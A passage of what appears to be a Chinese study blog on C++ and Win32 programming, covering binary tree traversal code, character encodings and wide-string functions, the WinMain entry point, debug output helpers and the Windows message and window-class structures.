class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> Left = <span class=\"built_in\">GetDepth</span>(Node-&gt;pLeft);</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> Right = <span class=\"built_in\">GetDepth</span>(Node-&gt;pRight);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> (Left &gt; Right) ? (Left + <span class=\"number\">1</span>) : (Right + <span class=\"number\">1</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//获取根节点</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"> TreeNode&lt;T&gt;* BsortTree&lt;T&gt;::<span class=\"built_in\">GetRoot</span>() &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pRootNode;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//中序遍历</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">void</span> BsortTree&lt;T&gt;::<span class=\"built_in\">InOrderTraverse</span>(TreeNode&lt;T&gt;* pNode) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pNode == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">InOrderTraverse</span>(pNode-&gt;pLeft);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, pNode-&gt;element);</span><br><span class=\"line\">\t\t<span class=\"built_in\">InOrderTraverse</span>(pNode-&gt;pRight);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//前序遍历</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;<span class=\"comment\">//前序遍历</span></span><br><span class=\"line\"><span class=\"type\">void</span> BsortTree&lt;T&gt;::<span class=\"built_in\">PreOrderTraverse</span>(TreeNode&lt;T&gt;* pNode) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pNode != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, pNode-&gt;element);</span><br><span class=\"line\">\t\t<span class=\"built_in\">PreOrderTraverse</span>(pNode-&gt;pLeft);</span><br><span class=\"line\">\t\t<span class=\"built_in\">PreOrderTraverse</span>(pNode-&gt;pRight);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//后序遍历</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">void</span> BsortTree&lt;T&gt;::<span class=\"built_in\">PostOrderTraverse</span>(TreeNode&lt;T&gt;* pNode) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pNode != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">PostOrderTraverse</span>(pNode-&gt;pLeft);</span><br><span class=\"line\">\t\t<span class=\"built_in\">PostOrderTraverse</span>(pNode-&gt;pRight);</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>, pNode-&gt;element);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">class</span> <span class=\"title class_\">T</span>&gt;</span><br><span class=\"line\"><span class=\"type\">void</span> BsortTree&lt;T&gt;::<span class=\"built_in\">Init</span>() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\">Monster <span class=\"title\">m1</span><span class=\"params\">(<span class=\"number\">1</span>, <span class=\"string\">&quot;混世魔王&quot;</span>,<span class=\"number\">50</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Monster <span class=\"title\">m2</span><span class=\"params\">(<span class=\"number\">2</span>, <span class=\"string\">&quot;金斯尔&quot;</span>, <span class=\"number\">100</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Monster <span class=\"title\">m3</span><span class=\"params\">(<span class=\"number\">3</span>, <span class=\"string\">&quot;游离&quot;</span>, <span class=\"number\">74</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Monster <span class=\"title\">m4</span><span class=\"params\">(<span class=\"number\">4</span>, <span class=\"string\">&quot;尔康&quot;</span>, <span class=\"number\">56</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Monster <span class=\"title\">m5</span><span class=\"params\">(<span class=\"number\">5</span>, <span class=\"string\">&quot;二讹&quot;</span>, <span class=\"number\">88</span>)</span></span>;</span><br><span class=\"line\">\t<span class=\"function\">Monster <span class=\"title\">m6</span><span class=\"params\">(<span class=\"number\">6</span>, <span class=\"string\">&quot;传奇&quot;</span>, <span class=\"number\">999</span>)</span></span>;</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n1 = <span class=\"keyword\">new</span> <span class=\"built_in\">TreeNode</span>&lt;Monster&gt;(m1);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n2 = <span class=\"keyword\">new</span> <span class=\"built_in\">TreeNode</span>&lt;Monster&gt;(m2);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n3 = <span class=\"keyword\">new</span> <span class=\"built_in\">TreeNode</span>&lt;Monster&gt;(m3);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n4 = <span class=\"keyword\">new</span> <span class=\"built_in\">TreeNode</span>&lt;Monster&gt;(m4);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n5 = <span class=\"keyword\">new</span> <span class=\"built_in\">TreeNode</span>&lt;Monster&gt;(m5);</span><br><span class=\"line\">\tTreeNode&lt;Monster&gt;* n6 = <span class=\"keyword\">new</span> <span class=\"built_in\">TreeNode</span>&lt;Monster&gt;(m6);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpRootNode = n3;</span><br><span class=\"line\">\tn3-&gt;pLeft = n2;</span><br><span class=\"line\">\tn3-&gt;pRight = n1;</span><br><span class=\"line\">\tn1-&gt;pLeft = n4;</span><br><span class=\"line\">\tn1-&gt;pRight = n5;</span><br><span class=\"line\">\t<span class=\"comment\">//n5-&gt;pRight = n6;</span></span><br><span class=\"line\">\t<span class=\"comment\">//size = 6;</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t 3</span></span><br><span class=\"line\"><span class=\"comment\">  2     1</span></span><br><span class=\"line\"><span class=\"comment\">      4    5</span></span><br><span class=\"line\"><span class=\"comment\">\t          6</span></span><br><span class=\"line\"><span class=\"comment\">\t</span></span><br><span class=\"line\"><span class=\"comment\">\t</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>上面的代码参参考了<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjQwODgzMi9hcnRpY2xlL2RldGFpbHMvMTE2NDY2MTM3\">滴水二叉树实现详细注释_wow. 的博客 - CSDN 博客</span>的代码，实在写不出</p>\n<h3 id=\"vectorlinklistbtree反汇编\"><a class=\"markdownIt-Anchor\" href=\"#vectorlinklistbtree反汇编\">#</a> Vector，LinkList，Btree 反汇编</h3>\n<h2 id=\"win32\"><a class=\"markdownIt-Anchor\" href=\"#win32\">#</a> win32</h2>\n<h3 id=\"宽字符\"><a class=\"markdownIt-Anchor\" href=\"#宽字符\">#</a> 宽字符</h3>\n<p>ASCII：0xxxxxxx</p>\n<p>extend ASCII：0xxxxxxx-1xxxxxxx</p>\n<p>GB2312：用两个字节存储一个汉字，最高位都是 1，可能乱码，因为可能不同国家都对他做了扩展，其次存储不方便</p>\n<p>Unicode：解决乱码</p>\n<p>乱码就是一个多个符号对应同一个编码</p>\n<p>utf8/utf16: 变长的 Unicode</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//中ASCII d6 d0  unicode 4e 2d</span><br><span class=\"line\">char x = &#x27;中&#x27;;    //产生截断D0</span><br><span class=\"line\">wchar_t x1 = &#x27;中&#x27;;   //D0 D6,按照ASCII解析</span><br><span class=\"line\">wchar_t x2 = L&#x27;中&#x27;;   //2d 4e按照Unicode解析</span><br><span class=\"line\"></span><br><span class=\"line\">char x[] = &quot;中国&quot;;  //使用扩展ASCII，以00(\\n)结尾</span><br><span class=\"line\">wchar_t x1[] = L&quot;中国&quot;;   //使用Unicode，结尾是00 00 (\\0\\0)</span><br><span class=\"line\"></span><br><span class=\"line\">printf(&quot;%s\\n&quot;,x);</span><br><span class=\"line\">wprintf(L&quot;%s\\n&quot;,x1);</span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;locale.h&gt;</span><br><span class=\"line\">int main &#123;</span><br><span class=\"line\">\tsetlocale(LC_ALL,&quot;&quot;);</span><br><span class=\"line\">\twprintf(L&quot;%s\\n&quot;,x1);</span><br><span class=\"line\">&#125;//设置地域，这样才能正常打印</span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">strlen(x)  //取得多字节中字符长度，4，不包含00</span><br><span class=\"line\">wcslen(x1);   //取得多字节字符串中字符长度,2，不包含00 00 </span><br><span class=\"line\"></span><br><span class=\"line\">中A国   5 3</span><br><span class=\"line\"></span><br><span class=\"line\">wcscpy(x1,x1);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230309190055917.png\" alt=\"image-20230309190055917\"></p>\n<p>Win32 API  (应用程序接口)</p>\n<p>主要存放在 windows/system32 下面所有的 DLL，是 Windows 提供的函数，供使用</p>\n<p>Kernel32.dll: 最核心的功能模块，比如管理内存、进程和线程相关的函数等</p>\n<p>User32.dll: 是 Windows 用户界面相关应用程序接口，如创建窗口和发送消息等.</p>\n<p>GDI32.dll: 全称是 Graphical Device Interface (图形设备接口), 包含用于画图和显示文本的函数比如要显示一个程序窗口，就调用了其中的函数来画这个窗口</p>\n<p>这些 dll 是一个 ring3 接口，通过这些 dll 调用内核函数，可以理解为 ring3 和 ring0 的接口</p>\n<p>Windows 类型</p>\n<p>char CHAR</p>\n<p>wchar_t WCHAR</p>\n<p>TCHAR 是个可变类型，取决于当前工程是宽字节还是窄字节，是个宏</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CHAR cha[] = &quot;中国&quot;;</span><br><span class=\"line\">WCHAR chw[] = L&quot;中国&quot;;</span><br><span class=\"line\">TCHAR cht[] = TEXT(&quot;中国&quot;);</span><br></pre></td></tr></table></figure>\n<p>LPSTR（PSTR）</p>\n<p>LPTSTR（PTSTR）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PSTR pszChar[] = &quot;中国&quot;;</span><br><span class=\"line\">PWSTR pszWChar[] = L&quot;中国&quot;;</span><br><span class=\"line\">PTSTR pszTChar[] = TEXT(&quot;中国&quot;);</span><br></pre></td></tr></table></figure>\n<p>Windows 内核函数都是 w 的，如果是 a 调用，系统会先转成 w 在调用。并且都是用 c 写的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MessageBox() 也是一个宏，根据当前项目决定使用a还是w</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230309192926826.png\" alt=\"image-20230309192926826\"></p>\n<p>创建 win32application</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230309193255058.png\" alt=\"image-20230309193255058\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//APIENTRY = winapi = __stdcall</span></span><br><span class=\"line\"><span class=\"type\">int</span> APIENTRY <span class=\"title function_\">WinMain</span><span class=\"params\">(HINSTANCE hInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     HINSTANCE hPrevInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     LPSTR     lpCmdLine,</span></span><br><span class=\"line\"><span class=\"params\">                     <span class=\"type\">int</span>       nCmdShow)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> \t<span class=\"comment\">// <span class=\"doctag\">TODO:</span> Place code here.</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//hinstance 就是imagebase,在setting-&gt;Link-&gt;output-&gt;base address,里面是十进制</span></span><br><span class=\"line\"><span class=\"comment\">//win32没有控制台，没法输出，要是用OutputDebugString()需要按照以下方法，新建一个类，在源文件中包含</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\">.h</span><br><span class=\"line\"><span class=\"type\">void</span> __cdecl <span class=\"title function_\">OutputDebugStringF</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span>* format, ...)</span>;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> _DEBUG</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> DbgPrintf OutputDebugStringF</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> DbgPrintf</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">// DEBUG </span></span></span><br><span class=\"line\"></span><br><span class=\"line\">.cpp</span><br><span class=\"line\"><span class=\"type\">void</span> __cdecl <span class=\"title function_\">OutputDebugStringF</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span>* format, ...)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tva_list vlArgs;</span><br><span class=\"line\">\t<span class=\"type\">char</span> *strBuffer = (<span class=\"type\">char</span>*)GlobalAlloc(GPTR, <span class=\"number\">4096</span>);</span><br><span class=\"line\">\tva_start(vlArgs, format);</span><br><span class=\"line\">\t_vsnprintf(strBuffer, <span class=\"number\">4096</span> - <span class=\"number\">1</span>, format, vlArgs);</span><br><span class=\"line\">\tva_end(vlArgs);</span><br><span class=\"line\">\t<span class=\"built_in\">strcat</span>(strBuffer, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">\tOutputDebugStringA(strBuffer);</span><br><span class=\"line\">\tGlobalFree(strBuffer);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">OutputDebugString(<span class=\"string\">&quot;hello world\\n&quot;</span>);</span><br><span class=\"line\">DWORD a = <span class=\"number\">11122</span>;</span><br><span class=\"line\">DbgPrintf(<span class=\"string\">&quot;%d = 111&quot;</span>, a);</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD errors = GetLastError(); 放到出问题那行下面，得到错误编号,去Error Lookup查对应编号</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow);</span><br><span class=\"line\">hInstance 称为“实例句柄”或“模块句柄”。操作系统使用此值在内存中加载可执行文件时标识可执行文件 (EXE) 。 某些Windows函数需要实例句柄，例如加载图标或位图。</span><br><span class=\"line\">hPrevInstance 没有意义。 它在 16 位Windows中使用，但现在始终为零。</span><br><span class=\"line\">pCmdLine 包含命令行参数作为 Unicode 字符串。   111.exe hahahaha       hahahaha 就是命令行参数</span><br><span class=\"line\">nCmdShow 是一个标志，指示主应用程序窗口是最小化、最大化还是正常显示。</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;locale.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t//TestVector();</span><br><span class=\"line\">\tsetlocale(LC_ALL,&quot;&quot;);</span><br><span class=\"line\">\twchar_t x1[] = L&quot;傻逼&quot;;</span><br><span class=\"line\">\twprintf(L&quot;%s\\n&quot;,x1);</span><br><span class=\"line\">\tcout &lt;&lt; wcslen(x1) &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">\twchar_t x2[] = L&quot;你是智障&quot;;</span><br><span class=\"line\">\t//wcscpy(x2,x1);</span><br><span class=\"line\">\t//wprintf(L&quot;%s\\n&quot;,x2);</span><br><span class=\"line\">\t//cout &lt;&lt; wcscmp(x1,x1) &lt;&lt; &quot;\\n&quot;; </span><br><span class=\"line\">\twchar_t x3[] = L&quot;你是傻逼&quot;;</span><br><span class=\"line\">\t//x1第一次在x3中出现的位置，否则返回null</span><br><span class=\"line\">\tcout &lt;&lt; wcsstr(x3,x1) &lt;&lt; &quot;\\n&quot;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tprintf(&quot;Hello World!\\n&quot;);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"事件-消息\"><a class=\"markdownIt-Anchor\" href=\"#事件-消息\">#</a> 事件、消息</h3>\n<p>Windows 中的事件是一个 “动作”，这个动作可能是用户操作应用程序产生的，也可能是 Windows 自己产生的</p>\n<p>而消息，就是用来描述这些 “动作” 的，比如:</p>\n<p>Windows 为了能够准确的描述这些信息，提供了一个结构体：MSG，该结构体里面记录的事件的详细信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef struct tagMsg</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHWND hwnd;      //窗口句柄，由那个窗口处理</span><br><span class=\"line\">\tUINT message;   //动作类型/消息类型</span><br><span class=\"line\">\tWPARAM wParam;  //消息的详细说明</span><br><span class=\"line\">\tLPARAM lParam;  //消息的详细说明</span><br><span class=\"line\">\tDWORD time;     //时间</span><br><span class=\"line\">\tPOINT pt;       //坐标,x,y</span><br><span class=\"line\">&#125;MSG,*PMSG;</span><br></pre></td></tr></table></figure>\n<p>系统消息队列与应用程序消息队列</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230310192516428.png\" alt=\"image-20230310192516428\"></p>\n<p>根据窗口句柄将消息分发到不同应用程序队列</p>\n<p>判断应用程序队列中消息 类型是不是我关心的是就处理不是让 windows 去处理</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230310193925308.png\" alt=\"image-20230310193925308\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230310194619857.png\" alt=\"image-20230310194619857\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef WNDCLASSA WNDCLASS;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct tagWNDCLASSA &#123;</span><br><span class=\"line\">    UINT        style;</span><br><span class=\"line\">    WNDPROC     lpfnWndProc;  //处理消息的函数，传入函数名</span><br><span class=\"line\">    int         cbClsExtra;</span><br><span class=\"line\">    int         cbWndExtra;</span><br><span class=\"line\">    HINSTANCE   hInstance;   //窗口属于哪个应用程序</span><br><span class=\"line\">    HICON       hIcon;</span><br><span class=\"line\">    HCURSOR     hCursor;</span><br><span class=\"line\">    HBRUSH      hbrBackground;</span><br><span class=\"line\">    LPCSTR      lpszMenuName;</span><br><span class=\"line\">    LPCSTR      lpszClassName;</span><br><span class=\"line\">&#125; WNDCLASSA, *PWNDCLASSA, NEAR *NPWNDCLASSA, FAR *LPWNDCLASSA;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230310203005194.png\" alt=\"image-20230310203005194\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 11111.cpp : Defines the entry point for the application.</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdio.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;Tools.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">LRESULT CALLBACK <span class=\"title function_\">WindowProc</span><span class=\"params\">(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> APIENTRY <span class=\"title function_\">WinMain</span><span class=\"params\">(HINSTANCE hInstance,</span></span><br><span class=\"line\"><span class=\"params\">                     